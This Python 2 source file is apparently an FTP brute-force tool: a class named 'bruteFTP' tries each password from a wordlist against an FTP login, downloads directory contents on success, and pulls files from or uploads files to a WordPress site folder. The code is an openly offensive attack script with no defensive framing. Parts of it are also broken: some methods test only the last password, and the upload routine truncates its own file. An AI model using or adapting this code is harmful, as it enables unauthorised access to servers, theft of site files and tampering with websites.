import socket
import ftplib
import os, sys, os.path



class bruteFTP():
    def __init__(self, ip, port, login_to_server, file_name):
        self.login_to_server = login_to_server
        self.ip = ip
        self.port = port
        self.file_name = file_name

    def FTPlogin(self):

        file = "pasw.txt"
        try:
            socket.setdefaulttimeout(5) #sets time out for socket
            s = socket.socket() #creats a socket
            s.connect((self.ip, self.port)) #connects
            print "port", self.port, "open"
            pf = open("pasw.txt", 'r') #open a password file
            for line in pf.readlines():
                #runs every line
                password_2 = line.strip('\r').strip('\n')
                try:
                    ftp = ftplib.FTP(self.ip) #connects to ftp
                    ftp.login(self.login_to_server, password_2) #logins to ftp
                    print "[*]password is correct"
                    directory = './ftp/'
                    ftp.cwd(directory)
                    menu = ftp.nlst()
                    print "Menu", menu
                    for i in menu:
                        print "* :", i
                        path = raw_input("Enter path: ")
                        ftp.cwd(path)
                        for file in ftp.nlst():
                            local_filename = os.path.join(r"result", file)
                            lf = open(local_filename, "wb")
                            ftp.retrbinary("RETR " + file, lf.write, 8 * 1024)
                            print "Done!"
                    ftp.quit()#after succeful logon quits
                except:
                    print "[*]password", password_2, "is incorrect"

        except:#if port not open
            print "port", self.port, "is closed"


    def connect_to_server(self):
        file = "pasw.txt"
        pf = open(file, 'r') #open a password file
        for line in pf.readlines():
            password_2 = line.strip('\r').strip('\n')#runs every line
        try:
            ftp = ftplib.FTP(self.ip) #connects to ftp
            ftp.getwelcome()
            ftp.login(self.login_to_server, password_2)
            print "[*]password is correct"
            directory = './Sites/wordpress-new/'
            ftp.cwd(directory)
            for inline in ftp.nlst():
                if inline in self.file_name:
                    local_filename = os.path.join(r"result", inline)
                    lf = open(local_filename, "wb")
                    ftp.retrbinary("RETR " + inline, lf.write, 8 * 1024)
                    print "Done!"

        except:
            print "[*]password", password_2, "is incorrect"


    def send_file_to_server(self):
        file = "pasw.txt"
        pf = open(file, 'r') #open a password file
        for line in pf.readlines():
            password_2 = line.strip('\r').strip('\n')#runs every line
        try:
            ftp = ftplib.FTP(self.ip) #connects to ftp
            ftp.getwelcome()
            ftp.login(self.login_to_server, password_2)
            print "[*]password is correct"
            print 'step 1: ',self.file_name
            directory = './Sites/wordpress-new/'
            print 'step 2: ',self.file_name
            ftp.cwd(directory)
            print 'step 3: ',self.file_name
            # print a
            our_file = self.file_name
            ftp.storbinary("STOR" + our_file, open("result/" + our_file, "wb"))
            print "File uploaded!"

        except:
            print "[*]password", password_2, "is incorrect"


